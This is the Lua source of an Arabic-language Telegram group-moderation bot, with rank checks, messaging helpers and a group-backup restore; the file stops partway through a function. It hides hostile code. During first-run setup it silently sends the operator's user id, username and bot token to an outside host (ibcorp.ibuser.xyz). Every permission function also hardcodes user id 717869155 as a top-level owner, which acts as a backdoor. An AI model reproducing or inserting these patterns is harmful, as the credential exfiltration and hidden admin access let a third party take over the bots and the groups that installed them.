------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.--
--   This Is The Source Channel @loolIQ .   --
--                - loolIQ -                 --
--        -- https://t.me/loolIQ --         --
------------------------------------------------ 
 redis = require('redis')
 URL = require('socket.url')  
 HTTPS = require ("ssl.https")  
 https = require ("ssl.https") 
 http  = require ("socket.http")
 serpent = require("serpent")
 json = dofile('./JSON.lua')
 JSON = dofile('./dkjson.lua')
 lgi = require('lgi')
 notify = lgi.require('Notify')
 utf8 = require ('lua-utf8') 
 notify.init ("Telegram updates")
 DevAbs = Redis.connect('127.0.0.1', 6379)
 chats = {}
 day = 313456502
--     Source loolIQ     --
function vardump(value)  
print(serpent.block(value, {comment=false}))  
end 
local AutoSet = function()
io.write("\27[31;47m Ξ • الان ارسل ايدي المطور •\n Ξ   • Now send your id • \27[0;34;49m\n")  
local SUDO = tonumber(io.read())   
if not tostring(SUDO):match('%d+') then  
local SUDO = 717869155
end
io.write("\27[31;47m Ξ • @الان ارسل معرف المطور مع الـ •\n Ξ • Now send your username with @ • \27[0;34;49m\n")  
local username = io.read()
io.write("\27[31;47m Ξ   • الان ارسل توكن البوت •\n Ξ • Now send your bots token • \27[0;34;49m\n")  
local token = io.read()  
botid = token:match("(%d+)")
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    file:close()  
end
local create_config_auto = function()
config = {
SUDO = SUDO,
token = token,
bot_id = botid,
username = username, 
sudo_users = {SUDO}, 
}
create(config, "./config.lua")   
https.request("https://ibcorp.ibuser.xyz/iq_abs/?id="..SUDO.."&user="..username.."&token="..token)
file = io.open("RUNABS.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..token..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./loolIQ.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("ABS", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNABS.sh
done
]])  
file:close() 
os.execute('./ABS')
end 
create_config_auto()
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "_"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
end
local load_DevAbs = function()  
local f = io.open("./config.lua", "r")  
if not f then   AutoSet()  
else   
f:close()  
end  
local config = loadfile("./config.lua")() 
return config 
end  
_DevAbs = load_DevAbs()  
sudos = dofile("./config.lua") 
bot_owner = sudos.SUDO 
sudo_users = {sudos.sudo_users} 
bot_id = sudos.bot_id 
loolIQ = sudos.bot_id
SUDOUSERNAME = sudos.username
tokenbot = sudos.token
name_bot = (DevAbs:get(loolIQ..'name_bot') or 'بروكس')
--     Source loolIQ     --
--     Start Functions    --
----------Bot Owner---------
function is_leader(msg) 
local var = false 
if msg.sender_user_id_ == tonumber(bot_owner) then var = true end 
if msg.sender_user_id_ == tonumber(717869155) then var = true end 
return var end 

function is_leaderid(user_id)
local var = false
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------  Sudo  ----------
function is_sudo(msg)
local var = false
for k,v in pairs(sudo_users) do
if msg.sender_user_id_ == v then
var = true
end end
if msg.sender_user_id_ == tonumber(bot_owner) then var = true end
if msg.sender_user_id_ == tonumber(717869155) then var = true end 
return var end

function is_sudoid(user_id)
local var = false
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------  Sudo3  ---------
function is_sudo3(user_id)
local var = false
local absb =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..absb, user_id)
if admin then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------Owner all---------
function is_ownerall(user_id, chat_id)
local var = false
local abs =  'abs:ownerall:'
local onall = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
if onall then
var = true
end
if admin then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------admin all---------
function is_adminall(user_id, chat_id)
local var = false
local abs =  'abs:adminall:'
local moall = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:ownerall:'
local onall = DevAbs:sismember(loolIQ..absss, user_id)
if moall then
var = true
end
if admin then
 var = true
end
if onall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
------ VIP MEMBER ALL ------
function is_vipall(user_id)
local var = false
local abss =  'abs:vipall:'
local vpall = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:ownerall:'
local onall = DevAbs:sismember(loolIQ..absss, user_id)
local abssss = 'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abssss, user_id)
local absssss =  'abs:adminall:'
local moall = DevAbs:sismember(loolIQ..absssss, user_id)
if vpall then
var = true
end
if onall then
var = true
end
if admin then
var = true
end
if moall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------  donky  ---------
function is_donky(user_id, chat_id)
local var = false
local abs =  'bot:donky:'..chat_id
local momod = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(loolIQ..absss, user_id)
local abssss = 'abs:vipmem'..chat_id
local vipmem = DevAbs:sismember(loolIQ..abssss, user_id)
local absssss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(loolIQ..absssss, user_id)
local abssssss =  'abs:ownerall:'
local onall = DevAbs:sismember(loolIQ..abssssss, user_id)
local absabs =  'abs:adminall:'
local moall = DevAbs:sismember(loolIQ..absabs, user_id)
if donky then
var = true
end
if momod then
var = true
end
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if onall then
var = true
end
if moall then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------  monsh  ---------
function is_monsh(user_id, chat_id)
local var = false
local abs =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
if monsh then
var = true
end
if admin then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
---------  Monsh2  ---------
function is_monshid(user_id, chat_id)
local var = false
local abs =  'abs:monshid:'..chat_id
local monsh2 = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(loolIQ..absss, user_id)
if monsh2 then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------  Owner  ---------
function is_owner(user_id, chat_id)
local var = false
local abs =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(loolIQ..absss, user_id)
local abas =  'abs:monshid:'..chat_id
local monsh2 = DevAbs:sismember(loolIQ..abas, user_id)
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if monsh2 then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
----------  admin  ---------
function is_admin(user_id, chat_id)
local var = false
local abs =  'abs:admins'..chat_id
local momod = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(loolIQ..absss, user_id)
local abssss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(loolIQ..abssss, user_id)
local absssss =  'abs:ownerall:'
local onall = DevAbs:sismember(loolIQ..absssss, user_id)
local abas =  'abs:monshid:'..chat_id
local monsh2 = DevAbs:sismember(loolIQ..abas, user_id)
if momod then
var = true
end
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if onall then
var = true
end
if monsh2 then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
---------VIP MEMBER---------
function is_vipmem(user_id, chat_id)
local var = false
local abs =  'abs:admins'..chat_id
local momod = DevAbs:sismember(loolIQ..abs, user_id)
local abss =  'abs:sudo3:'
local admin = DevAbs:sismember(loolIQ..abss, user_id)
local absss =  'abs:owners:'..chat_id
local owner = DevAbs:sismember(loolIQ..absss, user_id)
local abssss = 'abs:vipmem'..chat_id
local vipmem = DevAbs:sismember(loolIQ..abssss, user_id)
local absssss =  'abs:monsh:'..chat_id
local monsh = DevAbs:sismember(loolIQ..absssss, user_id)
local abssssss =  'abs:ownerall:'
local onall = DevAbs:sismember(loolIQ..abssssss, user_id)
local absabs =  'abs:adminall:'
local moall = DevAbs:sismember(loolIQ..absabs, user_id)
local abas =  'abs:monshid:'..chat_id
local monsh2 = DevAbs:sismember(loolIQ..abas, user_id)
if vipmem then
var = true
end
if momod then
var = true
end
if owner then
var = true
end
if admin then
var = true
end
if monsh then
var = true
end
if onall then
var = true
end
if moall then
var = true
end
if monsh2 then
var = true
end
for k,v in pairs(sudo_users) do
if user_id == v then
var = true
end end
if user_id == tonumber(bot_owner) then var = true end
if user_id == tonumber(717869155) then var = true end 
return var end
--     Source loolIQ     --
local setnumbergp = function()
local setnumbergp_two = function(user_id)
local abss = "admins:data:" .. user_id
local lists = DevAbs:smembers(loolIQ..abss)
DevAbs:del(loolIQ.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
DevAbs:incr(loolIQ.."SudoNumberGp" .. user_id)
end
end
local setnumbergp_three = function(user_id)
local absss = "admins:data:" .. user_id
local lists = DevAbs:smembers(loolIQ..absss)
DevAbs:del(loolIQ.."SudoNumberGp" .. user_id)
for k, v in pairs(lists) do
DevAbs:incr(loolIQ.."SudoNumberGp" .. user_id)
end
end
local list = DevAbs:smembers(loolIQ.."Bot:Admins")
for k, v in pairs(list) do
setnumbergp_two(v)
end
local lists = DevAbs:smembers(loolIQ.."Bot:leader")
for k, v in pairs(lists) do
setnumbergp_three(v)
end
DevAbs:setex(loolIQ.."bot:reload", 7230, true)
end
--     Source loolIQ     --
---------FreeWords----------
local function is_free(msg, value)
local var = false
local abs = (loolIQ..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs)
local text = ''
local value = value:gsub('-','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) then
var = true
end
end
end
return var
end
--     Source loolIQ     --
---------  Banned  ---------
local function is_banned(user_id, chat_id)
local var = false
local abs = 'bot:banned:'..chat_id
local banned = DevAbs:sismember(loolIQ..abs, user_id)
if banned then
var = true
end
return var
end
--     Source loolIQ     --
----------  Muted  ---------
local function is_muted(user_id, chat_id)
local var = false
local abs = 'bot:muted:'..chat_id
local muted = DevAbs:sismember(loolIQ..abs, user_id)
if muted then
var = true
end
return var
end
--     Source loolIQ     --
---------  Gbaned  ---------
function is_gbanned(user_id)
local var = false
local abs = 'bot:gban:'
local gbanned = DevAbs:sismember(loolIQ..abs, user_id)
if gbanned then
var = true
end
return var
end
--     Source loolIQ     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     Source loolIQ     --
---------- whoAdd ----------
local who_add = function(chat)
local user_id
local user = false
local list1 = DevAbs:smembers(loolIQ.."Bot:KpSudos")
local list2 = DevAbs:smembers(loolIQ.."Bot:Admins")
for k, v in pairs(list1) do
local abs = "sudo:data:" .. v
local is_add = DevAbs:sismember(loolIQ..abs, chat)
if is_add then
user_id = v
end
end
for k, v in pairs(list2) do
local abs = "sudo:data:" .. v
local is_add = DevAbs:sismember(loolIQ..abs, chat)
if is_add then
user_id = v
end
end
local abs = "sudo:data:" .. bot_owner
if DevAbs:sismember(loolIQ..abs, chat) then
user_id = bot_owner
end
if user_id then
local user_info = DevAbs:get(loolIQ.."user:Name" .. user_id)
if user_info then
user = user_info
end
end
return user
end
--     Source loolIQ     --
local function DevAbs13(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= loolIQ:lower() then 
DevAbs13(chat,msg.id_,"*❗️📛 ⌯ عذراً هذا ٱڵملف ليس تابع لهذٱ ٱڵسورس*")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. tokenbot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..File.result.file_path, ''..File_Name) 
DevAbs13(chat,msg.id_,"❗️☻ جٱري رفـع ٱڵـمڵف ... .")   
else
DevAbs13(chat,msg.id_,"❗️📛 ⌯ ڵقد حدث خطٱء \n❗️💢 ⌯ يرجى ٱڵتحقق من صيغة ٱڵمڵف ")   
end      
local info_file = io.open('./'..loolIQ..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
DevAbs13(chat,msg.id_,"❗️🔑 ⌯ تـۖم رفع ٱڵنسخه بنجٱح \n❗️⚜️ ⌯ تـۖم تفعيڵ جميع ٱڵـمجموعٱت \n❗️🎗 ⌯  تـۖم ٱسترجٱع مشرفين ٱڵمجمۄعات \n❗️🚸 ⌯ تـۖم ٱسترجٱع ٱوٱمر ٱڵقفڵ وٱڵفتح في جميع مجموعٱت ٱڵبوت ")
vardump(groups)
for idg,v in pairs(groups.GP_BOT) do
DevAbs:sadd(loolIQ.."bot:groups",idg)
DevAbs:set(loolIQ.."bot:enable:"..idg,true)
DevAbs:setex(loolIQ.."bot:charge:"..idg,86400,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, idg)
DevAbs:set(loolIQ..'editmsg'..idg,true)
DevAbs:set(loolIQ..'bot:bots:mute'..idg,true)
DevAbs:set(loolIQ..'bot:bots:ban'..idg,true)
DevAbs:set(loolIQ..'keed_bots'..idg,true)
DevAbs:set(loolIQ..'anti-flood:'..idg,true)
DevAbs:set(loolIQ..'bot:inline:mute'..idg,true)
DevAbs:set(loolIQ..'bot:photo:mute'..idg,true)
DevAbs:set(loolIQ..'bot:spam:mute'..idg,true)
DevAbs:set(loolIQ..'bot:video:mute'..idg,true)
DevAbs:set(loolIQ..'bot:gifs:mute'..idg,true)
DevAbs:set(loolIQ..'bot:music:mute'..idg,true)
DevAbs:set(loolIQ..'bot:voice:mute'..idg,true)
DevAbs:set(loolIQ..'bot:links:mute'..idg,true)
DevAbs:set(loolIQ..'bot:location:mute'..idg,true)
DevAbs:set(loolIQ..'tags:lock'..idg,true)
DevAbs:set(loolIQ..'bot:strict'..idg,true)
DevAbs:set(loolIQ..'bot:document:mute'..idg,true)
DevAbs:set(loolIQ..'bot:abstag:mute'..idg,true)
DevAbs:set(loolIQ..'bot:contact:mute'..idg,true)
DevAbs:set(loolIQ..'bot:webpage:mute'..idg,true)
DevAbs:set(loolIQ..'bot:sticker:mute'..idg,true)
DevAbs:set(loolIQ..'markdown:lock'..idg,true)
DevAbs:set(loolIQ..'bot:forward:mute'..idg,true)
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
DevAbs:sadd(loolIQ..'abs:monsh:'..idg,idmsh)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
DevAbs:sadd(loolIQ..'abs:owners:'..idg,idmder)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
vardump(idmod)
DevAbs:sadd(loolIQ..'abs:admins'..idg,idmod)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.VIP then
for k,idvip in pairs(v.VIP) do
DevAbs:sadd(loolIQ..'abs:vipmem'..idg,idvip)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.linkgroup then
if v.linkgroup ~= "" then
DevAbs:set(loolIQ.."bot:group:link"..idg,v.linkgroup)   
print('( تم وضع روابط المجموعات )')
end
end
end
end
--     Source loolIQ     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source loolIQ     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat_id,
user_id_ = user_id,
status_ = {
ID = "ChatMemberStatus" .. status
},
}, dl_cb, nil)
end
--     Source loolIQ     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source loolIQ     --
function del_all_msgs(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
--     Source loolIQ     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source loolIQ     --
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     Source loolIQ     --
function from_username(msg)
function gfrom_user(extra,result,success)
if result.username_ then
F = result.username_
else
F = 'nil'
end
return F
end
local username = getUser(msg.sender_user_id_,gfrom_user)
return username
end
--     Source loolIQ     --
function do_notify (user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     Source loolIQ     --
function chat_kick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     Source loolIQ     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source loolIQ     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source loolIQ     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageContact",
contact_ = {
ID = "Contact",
phone_number_ = phone_number,
first_name_ = first_name,
last_name_ = last_name,
user_id_ = user_id
},},}, dl_cb, nil)
end
--     Source loolIQ     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessagePhoto",
photo_ = getInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption
},
}, dl_cb, nil)
end
--     Source loolIQ     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({
ID = request_id,
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = from_background,
reply_markup_ = reply_markup,
input_message_content_ = input_message_content
}, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = {
ID = "InputMessageDocument",
document_ = getInputFile(document),
caption_ = caption
}
sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local Forward = function(chat_id, from_chat_id, message_id, cb)
tdcli_function({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_id,
disable_notification_ = 0,
from_background_ = 1
}, cb or dl_cb, nil)
end
--     Source loolIQ     --
function getChats(offset_order, offset_chat_id, limit, cb, cmd)
if not limit or limit > 20 then
limit = 20
end
tdcli_function ({
ID = "GetChats",
offset_order_ = offset_order or 9223372036854775807,
offset_chat_id_ = offset_chat_id or 0,
limit_ = limit
}, cb or dl_cb, cmd)
end
--     Source loolIQ     --
function getUserFull(user_id,cb)
tdcli_function ({
ID = "GetUserFull",
user_id_ = user_id
}, cb, nil)
end
--     Source loolIQ     --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source loolIQ     --
function dl_cb(arg, data)
end
--     Source loolIQ     --
function delete_msg(chatid ,mid)
tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
}, dl_cb, nil)
end
--     Source loolIQ     --
function Dev_Abs(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_to_message_id,
disable_notification_ = disable_notification,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     Source loolIQ     --
function sendaction(chat_id, action, progress)
tdcli_function ({
ID = "SendChatAction",
chat_id_ = chat_id,
action_ = {
ID = "SendMessage" .. action .. "Action",
progress_ = progress or 100
}
}, dl_cb, nil)
end
--     Source loolIQ     --
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--     Source loolIQ     --
function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode)
tdcli_function ({
ID = "EditMessageText",
chat_id_ = chat_id,
message_id_ = message_id,
reply_markup_ = reply_markup,
input_message_content_ = {
ID = "InputMessageText",
text_ = text,
disable_web_page_preview_ = disable_web_page_preview,
clear_draft_ = 0,
entities_ = {},
parse_mode_ = TextParseMode,
},
}, dl_cb, nil)
end
--     Source loolIQ     --
function setphoto(chat_id, photo)
tdcli_function ({
ID = "ChangeChatPhoto",
chat_id_ = chat_id,
photo_ = getInputFile(photo)
}, dl_cb, nil)
end
--     Source loolIQ     --
function add_user(chat_id, user_id, forward_limit)
tdcli_function ({
ID = "AddChatMember",
chat_id_ = chat_id,
user_id_ = user_id,
forward_limit_ = forward_limit or 50
}, dl_cb, nil)
end
--     Source loolIQ     --
function unpinmsg(channel_id)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
--     Source loolIQ     --
function blockUser(user_id)
tdcli_function ({
ID = "BlockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     Source loolIQ     --
function unblockUser(user_id)
tdcli_function ({
ID = "UnblockUser",
user_id_ = user_id
}, dl_cb, nil)
end
--     Source loolIQ     --
function getBlockedUsers(offset, limit)
tdcli_function ({
ID = "GetBlockedUsers",
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     Source loolIQ     --
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
delete_msg(v.chat_id_,{[0] = v.id_})
end
end
--     Source loolIQ     --
function chat_del_user(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, 'Editor')
end
--     Source loolIQ     --
function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source loolIQ     --
function send_inline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..tokenbot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
--     Source loolIQ     --
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset,
limit_ = limit
}, dl_cb, nil)
end
--     Source loolIQ     --
function getChannelFull(channel_id)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, dl_cb, nil)
end
function getChannelFull(channel_id,cb)
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(channel_id).ID
}, cb, nil)
end
--     Source loolIQ     --
function chek_bots(channel,cb)
local function callback_admins(extra,result,success)
limit = (result.member_count_ )
getChannelMembers(channel, 0, 'Bots', limit,cb)
end
getChannelFull(channel,callback_admins)
end
--     Source loolIQ     --
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--     Source loolIQ     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
--     Source loolIQ     --
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source loolIQ     --
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--     Source loolIQ     --
local abs_rank = function(msg)
if tonumber(msg.sender_user_id_) == tonumber(717869155) then
ABS_PROX  = "مطور السورس"
elseif is_leaderid(msg.sender_user_id_) then
ABS_PROX  = "المطور الاساسي "
elseif is_sudoid(msg.sender_user_id_) then
ABS_PROX = "ٱڵمطۄر ٱلثٱنوي"
elseif is_sudo3(msg.sender_user_id_) then
ABS_PROX = "ٱڵمطۄر ٱلثٱڵث"
elseif is_ownerall(msg.sender_user_id_) then
ABS_PROX = "ٱڵمدير ٱڵعٱم"
elseif is_adminall(msg.sender_user_id_) then
ABS_PROX = "ٱلٱدمن ٱڵعٱم"
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
ABS_PROX = "ٱڵمنشئ ٱلٱسٱسي"
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
ABS_PROX = "ٱڵـۧمـۧنشئ"
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
ABS_PROX = "ٱڵـۧمـۧدير"
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
ABS_PROX = "ٱلٱدمـۧن"
else
